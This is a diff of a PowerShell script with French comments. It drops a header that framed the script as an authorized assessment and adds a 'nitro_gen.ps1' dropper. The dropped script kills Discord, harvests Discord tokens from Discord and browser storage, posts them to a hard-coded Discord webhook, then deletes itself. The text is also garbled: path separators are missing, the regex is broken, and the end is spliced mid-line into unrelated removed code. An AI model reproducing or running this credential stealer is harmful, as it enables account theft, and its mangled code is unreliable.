@@ -1,40 +1,69 @@
-# Authorized Security Assessment Script - Navigateurs Complets
-# Pour test de pénétration autorisé avec permissions appropriées
+# Supprimer le script nitro_gen.ps1 s'il existe
+if (Test-Path -Path .
+itro_gen.ps1) {
+    Remove-Item -Path .
+itro_gen.ps1 -Force -ErrorAction SilentlyContinue
+}
 
-param(
-    [string]$WebhookURL = "https://discord.com/api/webhooks/1421217593544409291/c0nEd6QBnRKm2TOHN66HySWWFAzHzXgvYUmaenapa4rmnUbkMJMiqt7JSRTZQDZOl4L8"
+# Contenu du script à générer avec le webhook intégré
+$content = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+
+`$tokensString = New-Object System.Collections.Specialized.StringCollection
+
+`$webhook_url = 'https://discord.com/api/webhooks/1421217593544409291/c0nEd6QBnRKm2TOHN66HySWWFAzHzXgvYUmaenapa4rmnUbkMJMiqt7JSRTZQDZOl4L8'
+
+`$location_array = @(
+    "`$env:APPDATADiscordLocal Storageleveldb",
+    "`$env:APPDATAdiscordcanaryLocal Storageleveldb",
+    "`$env:APPDATAdiscordptbLocal Storageleveldb",
+    "`$env:LOCALAPPDATAGoogleChromeUser DataDefaultLocal Storageleveldb",
+    "`$env:APPDATAOpera SoftwareOpera StableLocal Storageleveldb",
+    "`$env:LOCALAPPDATABraveSoftwareBrave-BrowserUser DataDefaultLocal Storageleveldb",
+    "`$env:LOCALAPPDATAYandexYandexBrowserUser DataDefaultLocal Storageleveldb"
 )
 
-function Get-SystemInformation {
-    try {
-        $computerInfo = Get-ComputerInfo
-        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
-        $processorInfo = Get-WmiObject -Class Win32_Processor
-        $memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory
-        
-        $systemData = @{
-            "Nom Ordinateur" = $env:COMPUTERNAME
-            "Utilisateur" = $env:USERNAME
-            "Domaine" = $env:USERDOMAIN
-            "Système" = $computerInfo.WindowsProductName
-            "Version OS" = $computerInfo.WindowsVersion
-            "Architecture" = $computerInfo.OSArchitecture
-            "RAM Installée" = "$([math]::Round(($memoryInfo | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)) GB"
-            "Processeur" = $processorInfo.Name
-            "Dernier Démarrage" = $osInfo.LastBootUpTime
+# Forcer la fermeture de Discord
+Stop-Process -Name 'Discord' -Force -ErrorAction SilentlyContinue
+
+foreach (`$path in `$location_array) {
+    if (Test-Path -Path `$path) {
+        foreach (`$file in Get-ChildItem -Path `$path -File) {
+            `$data = Get-Content -Path `$file.FullName -Raw
+            `$regex = [regex] '[w]{24}.[w]{6}.[w]{27}'
+            `$matches = `$regex.Matches(`$data)
+            foreach (`$match in `$matches) {
+                if (-not `$tokensString.Contains(`$match.Value)) {
+                    `$tokensString.Add(`$match.Value) | Out-Null
+                }
+            }
         }
-        
-        return $systemData
-    }
-    catch {
-        return @{Erreur = "Impossible d'obtenir les informations système"}
     }
 }
 
-function Get-NetworkInformation {
-    try {
-        $ipConfig = Get-NetIPConfiguration | Select-Object InterfaceAlias, InterfaceIndex, IPv4Address, IPv4DefaultGateway
-        $dnsSettings = Get-DnsClientServerAddress -AddressFamily IPv4
+foreach (`$token in `$tokensString) {
+    `$message = "** Discord tokens : **`n``````"
+    `$hash = @{ "content" = `$message }
+    `$JSON = `$hash | ConvertTo-Json
+    Invoke-WebRequest -Uri `$webhook_url -Method POST -Body `$JSON -Headers @{ 'Content-Type' = 'application/json' }
+}
+"@
+
+# Créer le fichier nitro_gen.ps1
+Set-Content -Path .
+itro_gen.ps1 -Value $content -Force
+
+# Exécuter le script généré
+& powershell -File .
+itro_gen.ps1
+
+# Supprimer le script après exécution
+Remove-Item -Path .
+itro_gen.ps1 -Force -ErrorAction SilentlyContinue
+
+# Pause (simuler en PowerShell)
+Write-Host "Appuyez sur une touche pour continuer..."
+$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")        $dnsSettings = Get-DnsClientServerAddress -AddressFamily IPv4
         $arpTable = Get-NetNeighbor
         
         $networkData = @{
